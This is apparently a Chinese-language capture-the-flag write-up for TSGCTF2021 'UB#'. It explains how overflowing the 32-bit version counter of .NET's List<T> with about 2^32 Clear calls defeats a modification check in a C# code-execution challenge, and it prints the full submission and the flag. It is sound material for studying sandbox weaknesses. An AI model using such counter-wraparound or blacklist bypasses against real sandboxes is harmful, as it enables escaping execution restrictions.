# TSGCTF2021 UB# WP

## 题目简述

服务端把选手提交的 C# 代码插入 `List<int>.ForEach` 的回调中，编译并运行。模板中的列表初始为 `[1, 2]`；正常情况下，只要回调把列表改成其他内容，`ForEach` 就会检测到集合版本变化并抛出异常，异常处理只输出 `failed`。若回调结束后列表长度仍为 2、但首元素不再是 1，模板才会输出随机密码，外层 Python 服务据此返回 flag。

输入过滤器禁止 `System`、`Reflection`、`unsafe`、引号等字符串，但允许普通循环和对字段 `a` 调用 `Clear`、`Add`。决定性漏洞是 .NET `List<T>` 用 32 位有符号整数 `_version` 记录修改次数；该计数可以溢出并回绕，从而让确实修改过的列表再次呈现与 `ForEach` 保存值相同的版本。这属于受限语言执行环境中的整数回绕利用。

## 解题过程

模板的关键部分为：

```csharp
public readonly System.Collections.Generic.List<int> a =
    new System.Collections.Generic.List<int>();

public Program() {
    a.Add(1);
    a.Add(2);
}

public void Run() {
    System.Action<int> b = x => {
        // user input
    };
    try {
        a.ForEach(b);
        if (a.Count != 2 || (a.Count > 0 && a[0] != 1)) {
            System.Console.WriteLine("random password");
        }
    } catch (System.Exception e) {
        System.Console.WriteLine("failed");
    }
}
```

`List<T>.ForEach` 在进入循环时保存当前 `_version`，每轮调用回调前后都会检查它是否仍相等。构造函数中的两次 `Add` 已令版本值为 2。`Clear` 即使面对空列表也会递增版本；连续执行 $2^{32}-2$ 次后，32 位计数从 2 回绕到 0。再执行两次 `Add`，版本重新变为 2，同时列表内容变为 `[9, 10]`：

```csharp
for (ulong i = 0; i < (1UL << 32) - 2UL; ++i) {
    a.Clear();
}
a.Add(9);
a.Add(10);
```

完整提交内容就是上面代码加结束行：

```text
                for (ulong i = 0; i < (1UL<<32)-2UL; ++i) {
                    a.Clear();
                }
                a.Add(9);
                a.Add(10);
END
```

回调返回时，列表的真实内容已改变，但 `_version` 恰好等于 `ForEach` 保存的旧值，所以不会抛出“枚举期间集合被修改”的异常。之后 `a.Count == 2` 且 `a[0] == 9`，程序输出外层服务事先嵌入的 60 字符随机密码，Python 包装器精确比对成功后返回：

```text
TSGCTF{eXc6ptiOn_1s_w0rk1ng_ExcePt_uNdeFineD_beh@vi0uR}
```

比赛中还出现过绕开预期计数回绕的解法，例如新建另一个 `Program` 实例并从实例外部改变字段，或从继承自 `Object` 的 `GetType()` 出发构造所需类型。它们说明黑名单没有形成可靠的能力边界，但官方求解器使用的是 `_version` 回绕方案。

## 方法总结

集合的“修改检测”只是快速失败机制，不是安全隔离。只要版本号是有限宽度整数，攻击者又能在受控代码中制造足够多次修改，就可能让计数回到旧值。本题要同时跟踪列表内容和 `_version`：大量 `Clear` 负责回绕版本，两次 `Add` 同时恢复版本值并写入目标内容。审计语言沙箱时也不能把关键字黑名单当作完整防护；真正需要限制的是可调用对象、计算资源和执行能力。
